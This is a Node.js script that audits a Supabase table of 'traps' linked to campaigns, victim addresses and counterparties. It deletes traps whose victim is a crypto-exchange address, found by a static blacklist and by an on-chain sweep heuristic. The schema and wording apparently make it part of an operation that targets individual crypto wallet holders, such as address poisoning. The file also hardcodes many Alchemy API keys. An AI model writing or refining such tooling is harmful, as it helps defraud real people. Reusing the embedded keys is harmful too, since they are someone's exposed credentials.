// audit_traps_cex.mjs

import 'dotenv/config';
import { createClient } from '@supabase/supabase-js';
import { createPublicClient, http, fallback, getAddress } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';

// ─── CEX Blacklist Setup ───
const CEX_BLACKLIST = new Set();

async function loadCexBlacklist() {
    const rawUrl = 'https://gist.githubusercontent.com/xfwil/07dadf39ae559829132952734ca524f3/raw/evm_cex.csv';
    try {
        console.log('[+] Fetching CEX blacklist from GitHub...');
        const res = await fetch(rawUrl);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const text = await res.text();

        const lines = text.split(/\r?\n/);
        let parsedCount = 0;

        for (let i = 1; i < lines.length; i++) {
            if (!lines[i].trim()) continue;
            let addr = lines[i].split(',')[0]?.trim().replace(/^["']|["']$/g, '').toLowerCase();
            if (addr && addr.startsWith('0x') && addr.length === 42) {
                CEX_BLACKLIST.add(addr);
                parsedCount++;
            }
        }
        console.log(`[+] Loaded ${CEX_BLACKLIST.size} UNIQUE CEX addresses into memory.\n`);
    } catch (err) {
        console.error(`[❌ FATAL] Failed to fetch CEX list: ${err.message}`);
        process.exit(1);
    }
}

// ─── Alchemy RPCs for Behavioral Check ───
const ALCHEMY_RPCS = {
    1: [ // 🚀 FULL ROTATING ETHEREUM ALCHEMY POOL
        'https://eth-mainnet.g.alchemy.com/v2/alch_vHCE0WOUUK1Mk5G0tyA76',
        'https://eth-mainnet.g.alchemy.com/v2/alch_YHosKAPg0sfm7jDhqvW74',
        'https://eth-mainnet.g.alchemy.com/v2/alch_lTX5t4XwroOB87Xk0AWbY',
        'https://eth-mainnet.g.alchemy.com/v2/alch_9dpiCogyGyxtA4ptC-zIl',
        'https://eth-mainnet.g.alchemy.com/v2/alch_Y8rCHyOCRzZAW_2xLVM5r',
        'https://eth-mainnet.g.alchemy.com/v2/alch_gx9srjXabB0OocIDNitUd',
        'https://eth-mainnet.g.alchemy.com/v2/alch_9P2EBVaMvYP0SPn4zjBUB',
        'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
        'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
        'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
        'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
        'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
        'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
    ],
    56: [ // BSC
        'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
        'https://bsc-dataseed.binance.org'
    ],
    137: [ // Polygon
        'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
        'https://polygon-rpc.com'
    ]
};

const stage2Clients = {
    1: createPublicClient({ chain: mainnet, transport: fallback(ALCHEMY_RPCS[1].map(url => http(url, { timeout: 15000 })), { retryCount: 3 }) }),
    56: createPublicClient({ chain: bsc, transport: fallback(ALCHEMY_RPCS[56].map(url => http(url, { timeout: 15000 })), { retryCount: 3 }) }),
    137: createPublicClient({ chain: polygon, transport: fallback(ALCHEMY_RPCS[137].map(url => http(url, { timeout: 15000 })), { retryCount: 3 }) }),
};

// 🚨 BEHAVIORAL CHECK: Catches CEX Deposit Addresses missed by static lists
async function isCexDepositBehavior(address, chainId = 1) {
    const client = stage2Clients[chainId];
    if (!client) return { isCex: false, reason: '' };

    try {
        const checksumAddr = getAddress(address);
        const category = chainId === 56 ? ['external', 'erc20'] : ['external', 'internal', 'erc20'];

        const [outRes, inRes] = await Promise.all([
            client.request({
                method: 'alchemy_getAssetTransfers',
                params: [{ fromBlock: '0x0', toBlock: 'latest', fromAddress: checksumAddr, category, maxCount: '0x64', order: 'desc', withMetadata: true }]
            }).catch(() => null),
            client.request({
                method: 'alchemy_getAssetTransfers',
                params: [{ fromBlock: '0x0', toBlock: 'latest', toAddress: checksumAddr, category, maxCount: '0x64', order: 'desc', withMetadata: true }]
            }).catch(() => null)
        ]);

        if (!outRes && !inRes) return { isCex: false, reason: '' };

        const outTransfers = outRes?.transfers || [];
        const inTransfers = inRes?.transfers || [];

        const uniqueInSenders = new Set(inTransfers.map(t => t.from?.toLowerCase()).filter(Boolean));
        const uniqueOutReceivers = new Set(outTransfers.map(t => t.to?.toLowerCase()).filter(Boolean));

        // BASE REQUIREMENT: Must receive from many unique people to be a deposit address
        if (uniqueInSenders.size < 10) {
            return { isCex: false, reason: '' };
        }

        // 🎯 CHECK A: Does it sweep to a known CEX wallet on the blacklist?
        for (const receiver of uniqueOutReceivers) {
            if (CEX_BLACKLIST.has(receiver)) {
                return { isCex: true, reason: 'Behavioral Match (Sweeps to Known CEX Wallet)' };
            }
        }

        // 🎯 CHECK B: Original Heuristic (Sends to 1-2 addresses, swept 5+ times)
        if (uniqueOutReceivers.size <= 2 && outTransfers.length >= 5) {
            return { isCex: true, reason: 'Behavioral Match (CEX Deposit Pattern)' };
        }

        return { isCex: false, reason: '' };
    } catch (err) {
        return { isCex: false, reason: '' }; // On error, assume not CEX
    }
}

// ─── Supabase Setup ───
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
if (!supabaseUrl || !supabaseKey) {
    console.error('[❌ FATAL] Missing Supabase credentials.');
    process.exit(1);
}
const supabase = createClient(supabaseUrl, supabaseKey);

// ─── CLI Flags ───
const isLiveMode = process.argv.includes('--live') || process.argv.includes('--execute');

console.log('\n==================================================');
if (isLiveMode) {
    console.log('[⚠️  LIVE EXECUTION MODE]');
    console.log('Traps with CEX victims WILL BE DELETED in batches of 500.');
} else {
    console.log('[🔍 DRY-RUN MODE ACTIVE]');
    console.log('No database records will be modified.');
}
console.log('==================================================\n');

// 🚀 HELPER: Delete a batch of CEX traps
async function deleteCexBatch(targetsToDelete) {
    const ids = targetsToDelete.map(t => t.id);
    let deletedCount = 0;

    for (let i = 0; i < ids.length; i += 100) {
        const batch = ids.slice(i, i + 100);
        const { error } = await supabase.from('traps').delete().in('id', batch);

        if (error) {
            console.error(`[❌ ERROR] Failed to delete batch: ${error.message}`);
        } else {
            deletedCount += batch.length;
        }
    }
    console.log(`\n[✅ AUTO-DELETE SUCCESS] Deleted ${deletedCount} CEX victim traps in this batch.\n`);
    return deletedCount;
}

async function auditTraps() {
    await loadCexBlacklist();
    console.log('[+] Scanning existing traps for CEX victims (Static + Behavioral)...\n');

    const PAGE_SIZE = 1000;
    let offset = 0;
    let totalScanned = 0;
    let totalDeletedOverall = 0;
    const cexTrapsFound = [];

    const BATCH_SIZE = 5;
    const BATCH_DELAY_MS = 600;

    while (true) {
        const { data, error } = await supabase
            .from('traps')
            .select('id, campaign_id, victim_address, counterparty_address, created_at')
            .eq('is_caught', false)
            .range(offset, offset + PAGE_SIZE - 1)
            .order('created_at', { ascending: false });

        if (error || !data || data.length === 0) break;

        for (let i = 0; i < data.length; i += BATCH_SIZE) {
            const batch = data.slice(i, i + BATCH_SIZE);

            const results = await Promise.all(batch.map(async (trap) => {
                const victimLower = trap.victim_address?.toLowerCase();

                // CHECK 1: Static Blacklist (Instant, 0 RPC cost)
                if (victimLower && CEX_BLACKLIST.has(victimLower)) {
                    return { trap, isCex: true, reason: 'Static Blacklist Match (Hot Wallet)' };
                }

                // CHECK 2: Behavioral Analysis (RPC Call)
                if (victimLower) {
                    const behaviorResult = await isCexDepositBehavior(trap.victim_address, 1);
                    if (behaviorResult.isCex) {
                        return { trap, isCex: true, reason: behaviorResult.reason };
                    }
                }

                return { trap, isCex: false, reason: '' };
            }));

            for (const res of results) {
                if (res.isCex) {
                    const trapWithReason = { ...res.trap, reason: res.reason };
                    cexTrapsFound.push(trapWithReason);

                    // 🚀 SAFE PRINTING: Removed clearLine/cursorTo to prevent PM2 TTY errors
                    console.log(`\n🚫 [${cexTrapsFound.length}] VICTIM IS CEX: ${trapWithReason.victim_address}`);
                    console.log(`   ↳ Reason:       ${trapWithReason.reason}`);
                    console.log(`   ↳ Counterparty: ${trapWithReason.counterparty_address}`);
                    console.log(`   ↳ Etherscan:    https://etherscan.io/address/${trapWithReason.victim_address}`);
                    console.log('   ─────────────────────────────────────────────────');
                }
            }

            // 🚀 AUTO-DELETE EVERY 500 FOUND (Only in Live Mode)
            if (isLiveMode && cexTrapsFound.length >= 500) {
                console.log(`\n[🧹 AUTO-DELETE TRIGGERED] Reached 500 CEX victims. Deleting batch...`);
                const deleted = await deleteCexBatch(cexTrapsFound);
                totalDeletedOverall += deleted;
                cexTrapsFound.length = 0; // Clear the array for the next batch
            }

            totalScanned += batch.length;
            console.log(`  [Progress] Scanned ${totalScanned} traps... Current batch has ${cexTrapsFound.length} CEX victims.`);

            if (i + BATCH_SIZE < data.length) {
                await new Promise(resolve => setTimeout(resolve, BATCH_DELAY_MS));
            }
        }

        if (data.length < PAGE_SIZE) break;
        offset += PAGE_SIZE;
    }

    console.log(`\n\n[✅ SCAN COMPLETE] Scanned ${totalScanned} active traps.`);

    // Delete any remaining found traps (less than 500)
    if (isLiveMode && cexTrapsFound.length > 0) {
        console.log(`\n[🧹 FINAL AUTO-DELETE] Deleting remaining ${cexTrapsFound.length} CEX victims...`);
        const deleted = await deleteCexBatch(cexTrapsFound);
        totalDeletedOverall += deleted;
    }

    console.log(`[🚨 TOTAL ALERT] Found and processed ${totalDeletedOverall > 0 ? totalDeletedOverall : cexTrapsFound.length} traps where the victim is a CEX.\n`);

    if (!isLiveMode && cexTrapsFound.length > 0) {
        console.log('═══════════════════════════════════════════════════════');
        console.log('[🔍 DRY-RUN] No traps were deleted.');
        console.log('[💡 ACTION] Review the addresses printed above on Etherscan.');
        console.log('[💡 ACTION] If confirmed, run: pm2 start audit_traps_cex.mjs --name "cex-audit" --no-autorestart -- --live\n');
    } else if (isLiveMode) {
        console.log(`[✅ SUCCESS] Successfully deleted ${totalDeletedOverall} CEX victim traps in total.`);
    } else {
        console.log('[✅ CLEAN] No CEX victims found.\n');
    }
}

auditTraps().catch(err => {
    console.error('[❌ FATAL] Unhandled exception:', err);
    process.exit(1);
});